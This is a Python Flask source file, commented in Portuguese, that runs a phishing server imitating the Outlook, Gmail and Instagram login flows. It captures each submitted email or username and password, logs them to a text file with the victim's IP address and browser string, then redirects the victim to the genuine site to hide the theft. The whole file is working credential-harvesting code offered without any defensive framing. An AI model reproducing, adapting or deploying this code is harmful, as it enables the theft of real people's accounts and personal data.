from flask import Flask, render_template, request, redirect, session
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Necessário para uso de sessões

# Função para salvar as credenciais
def log_credentials(platform, email, password):
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    # Optem o endereço IP do usuario
    ip_address = request.remote_addr

    # Optem o Navegador e o sistema operacional do usuario
    user_agent = request.headers.get('User-Agent')

    with open('credentials.txt', 'a') as f:
        f.write(f"[{now}] {platform} | Email: {email} | Password: {password} | IP: {ip_address} | User-Agent: {user_agent}\n")

# ---------- OUTLOOK ----------
@app.route('/outlook', methods=['GET', 'POST'])
def outlook_email():
    if request.method == 'POST':
        session['email'] = request.form['email']
        return redirect('/outlook-password')
    return render_template('outlook_email.html')

@app.route('/outlook-password', methods=['GET', 'POST'])
def outlook_password():
    email = session.get('email')  # Recupera o e-mail salvo
    if request.method == 'POST':
        password = request.form['password']
        log_credentials('Outlook', email, password)
        return redirect('https://outlook.live.com/')
    return render_template('outlook_password.html', email=email)  # Passa o e-mail para o HTML

# ---------- GMAIL ----------
@app.route('/gmail', methods=['GET', 'POST'])
def gmail_email():
    if request.method == 'POST':
        session['email'] = request.form['email']
        return redirect('/gmail-password')
    return render_template('gmail_email.html')

@app.route('/gmail-password', methods=['GET', 'POST'])
def gmail_password():
    email = session.get('email')
    if request.method == 'POST':
        password = request.form['password']
        log_credentials('Gmail', email, password)
        return redirect('https://mail.google.com/')
    return render_template('gmail_password.html', email=email)

# ---------- INSTAGRAM ----------
@app.route('/instagram', methods=['GET', 'POST'])
def instagram():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        log_credentials('Instagram', username, password)
        return redirect('https://www.instagram.com/')
    return render_template('instagram.html')

# ---------- MAIN ----------
if __name__ == '__main__':
    app.run(debug=True, port=5000)
